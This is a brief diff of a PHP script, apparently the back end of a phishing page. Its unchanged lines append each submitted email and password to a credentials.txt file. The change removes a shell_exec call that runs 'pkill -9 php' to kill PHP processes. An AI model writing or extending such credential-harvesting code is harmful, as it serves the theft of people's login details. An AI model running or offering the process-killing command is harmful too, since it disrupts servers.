@@ -5,5 +5,4 @@
   $credential = $date.$email.$password."\n";
   file_put_contents('credentials.txt', $credential, FILE_APPEND);
 
-	shell_exec('pkill -9 php'); 
 ?>
